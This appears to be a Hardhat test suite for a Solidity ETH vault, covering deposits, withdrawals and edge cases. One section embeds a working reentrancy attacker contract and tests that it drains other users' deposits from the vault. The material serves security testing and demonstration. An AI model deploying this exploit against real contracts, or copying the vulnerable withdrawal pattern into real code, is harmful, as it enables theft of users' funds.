import { expect } from "chai";
import { ethers } from "hardhat";
import { Signer } from "ethers";

describe("Vault Contract Tests", function () {
  let vault: any;
  let owner: Signer;
  let user1: Signer;
  let user2: Signer;
  let attacker: Signer;

  beforeEach(async function () {
    [owner, user1, user2, attacker] = await ethers.getSigners();
    
    const Vault = await ethers.getContractFactory("Vault");
    vault = await Vault.deploy();
    await vault.waitForDeployment();
  });

  describe("Deployment", function () {
    it("Should deploy successfully", async function () {
      expect(await vault.getAddress()).to.be.properAddress;
    });

    it("Should have zero initial balance", async function () {
      expect(await vault.getContractBalance()).to.equal(0);
    });
  });

  describe("Deposit functionality", function () {
    it("Should allow users to deposit ETH", async function () {
      const depositAmount = ethers.parseEther("1.0");
      
      await expect(vault.connect(user1).deposit({ value: depositAmount }))
        .to.emit(vault, "Deposit")
        .withArgs(await user1.getAddress(), depositAmount);
      
      expect(await vault.getBalance(await user1.getAddress())).to.equal(depositAmount);
      expect(await vault.getContractBalance()).to.equal(depositAmount);
    });

    it("Should reject deposits of 0 ETH", async function () {
      await expect(vault.connect(user1).deposit({ value: 0 }))
        .to.be.revertedWith("Must deposit something");
    });

    it("Should track multiple user deposits separately", async function () {
      const amount1 = ethers.parseEther("1.0");
      const amount2 = ethers.parseEther("2.0");
      
      await vault.connect(user1).deposit({ value: amount1 });
      await vault.connect(user2).deposit({ value: amount2 });
      
      expect(await vault.getBalance(await user1.getAddress())).to.equal(amount1);
      expect(await vault.getBalance(await user2.getAddress())).to.equal(amount2);
      expect(await vault.getContractBalance()).to.equal(amount1 + amount2);
    });
  });

  describe("Withdrawal functionality", function () {
    beforeEach(async function () {
      const depositAmount = ethers.parseEther("2.0");
      await vault.connect(user1).deposit({ value: depositAmount });
    });

    it("Should allow users to withdraw their funds", async function () {
      const withdrawAmount = ethers.parseEther("1.0");
      const userAddress = await user1.getAddress();
      
      await expect(vault.connect(user1).withdraw(withdrawAmount))
        .to.emit(vault, "Withdrawal")
        .withArgs(userAddress, withdrawAmount);
      
      expect(await vault.getBalance(userAddress)).to.equal(ethers.parseEther("1.0"));
    });

    it("Should reject withdrawal of more than deposited", async function () {
      const withdrawAmount = ethers.parseEther("3.0");
      
      await expect(vault.connect(user1).withdraw(withdrawAmount))
        .to.be.revertedWith("Insufficient balance");
    });

    it("Should reject withdrawal from users with no balance", async function () {
      const withdrawAmount = ethers.parseEther("1.0");
      
      await expect(vault.connect(user2).withdraw(withdrawAmount))
        .to.be.revertedWith("Insufficient balance");
    });
  });

  describe("Reentrancy vulnerability", function () {
    let attackerContract: any;

    beforeEach(async function () {
      // Deploy attacker contract
      const attackerCode = `
        // SPDX-License-Identifier: MIT
        pragma solidity ^0.8.19;
        
        interface IVault {
            function deposit() external payable;
            function withdraw(uint256 amount) external;
            function getBalance(address user) external view returns (uint256);
        }
        
        contract ReentrancyAttacker {
            IVault public vault;
            uint256 public attackAmount;
            uint256 public callCount;
            
            constructor(address _vault) {
                vault = IVault(_vault);
            }
            
            function attack() external payable {
                require(msg.value > 0, "Need ETH to attack");
                attackAmount = msg.value;
                
                // First deposit
                vault.deposit{value: msg.value}();
                
                // Then withdraw to trigger reentrancy
                vault.withdraw(msg.value);
            }
            
            receive() external payable {
                callCount++;
                if (callCount < 3 && address(vault).balance >= attackAmount) {
                    vault.withdraw(attackAmount);
                }
            }
            
            function getBalance() external view returns (uint256) {
                return address(this).balance;
            }
        }
      `;

      // Write attacker contract to file
      const fs = require("fs");
      const attackerPath = "contracts/ReentrancyAttacker.sol";
      fs.writeFileSync(attackerPath, attackerCode);

      // Compile
      await hre.run("compile");

      // Deploy attacker contract
      const AttackerFactory = await ethers.getContractFactory("ReentrancyAttacker");
      attackerContract = await AttackerFactory.connect(attacker).deploy(await vault.getAddress());
      await attackerContract.waitForDeployment();

      // Clean up
      fs.unlinkSync(attackerPath);
    });

    it("Should be vulnerable to reentrancy attack", async function () {
      // Set up victims with funds
      const victimDeposit = ethers.parseEther("5.0");
      await vault.connect(user1).deposit({ value: victimDeposit });
      await vault.connect(user2).deposit({ value: victimDeposit });

      const initialVaultBalance = await vault.getContractBalance();
      expect(initialVaultBalance).to.equal(victimDeposit * 2n);

      // Execute reentrancy attack
      const attackAmount = ethers.parseEther("1.0");
      await attackerContract.connect(attacker).attack({ value: attackAmount });

      // Check that more was drained than deposited by attacker
      const finalVaultBalance = await vault.getContractBalance();
      const attackerBalance = await attackerContract.getBalance();

      console.log("Initial vault balance:", ethers.formatEther(initialVaultBalance));
      console.log("Final vault balance:", ethers.formatEther(finalVaultBalance));
      console.log("Attacker gained:", ethers.formatEther(attackerBalance));

      // The attacker should have more than they put in
      expect(attackerBalance).to.be.gt(attackAmount);
      
      // The vault should have lost more than just the attacker's deposit
      expect(finalVaultBalance).to.be.lt(initialVaultBalance);
    });

    it("Should demonstrate the state inconsistency", async function () {
      // Deposit funds as victim
      const depositAmount = ethers.parseEther("2.0");
      await vault.connect(user1).deposit({ value: depositAmount });

      // Check balance before attack
      const userAddress = await user1.getAddress();
      const initialUserBalance = await vault.getBalance(userAddress);
      const initialContractBalance = await vault.getContractBalance();

      expect(initialUserBalance).to.equal(depositAmount);
      expect(initialContractBalance).to.equal(depositAmount);

      // Execute attack that will drain funds
      const attackAmount = ethers.parseEther("0.5");
      await attackerContract.connect(attacker).attack({ value: attackAmount });

      // After attack, user's recorded balance might still show funds
      // but contract balance is drained
      const finalUserBalance = await vault.getBalance(userAddress);
      const finalContractBalance = await vault.getContractBalance();

      console.log("User balance after attack:", ethers.formatEther(finalUserBalance));
      console.log("Contract balance after attack:", ethers.formatEther(finalContractBalance));

      // This demonstrates the inconsistency - user thinks they have funds
      // but contract has been drained
      if (finalUserBalance > finalContractBalance) {
        console.log("⚠️ State inconsistency detected: User balance > Contract balance");
      }
    });
  });

  describe("Edge cases", function () {
    it("Should handle multiple deposits from same user", async function () {
      const amount1 = ethers.parseEther("1.0");
      const amount2 = ethers.parseEther("0.5");
      
      await vault.connect(user1).deposit({ value: amount1 });
      await vault.connect(user1).deposit({ value: amount2 });
      
      expect(await vault.getBalance(await user1.getAddress())).to.equal(amount1 + amount2);
    });

    it("Should handle partial withdrawals", async function () {
      const depositAmount = ethers.parseEther("2.0");
      const withdrawAmount = ethers.parseEther("0.7");
      
      await vault.connect(user1).deposit({ value: depositAmount });
      await vault.connect(user1).withdraw(withdrawAmount);
      
      expect(await vault.getBalance(await user1.getAddress())).to.equal(depositAmount - withdrawAmount);
    });
  });
});